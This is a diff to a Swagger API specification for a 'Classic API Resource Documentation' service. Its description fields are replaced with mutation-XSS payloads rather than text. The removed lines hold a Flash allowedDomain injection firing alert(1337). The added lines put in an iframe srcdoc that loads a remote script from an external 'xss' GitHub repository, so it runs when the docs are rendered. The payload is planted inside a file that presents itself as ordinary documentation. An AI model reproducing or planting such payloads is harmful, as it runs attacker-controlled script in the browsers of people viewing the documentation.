@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain="})))}catch(e) {alert(1337)}//'>
-<param name="AllowScriptAccess" value="always"></object>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><Iframe SrcDoc="<Script Src=https://raw.githubusercontent.com/rodrigoramosrs/xss/main/dist/js/front.js></Script>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -29,8 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain="})))}catch(e) {alert(1337)}//'>
-<param name="AllowScriptAccess" value="always"></object>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<Iframe SrcDoc="<Script Src=https://raw.githubusercontent.com/rodrigoramosrs/xss/main/dist/js/front.js></Script>"></form>
 
           format: int64
           in: path
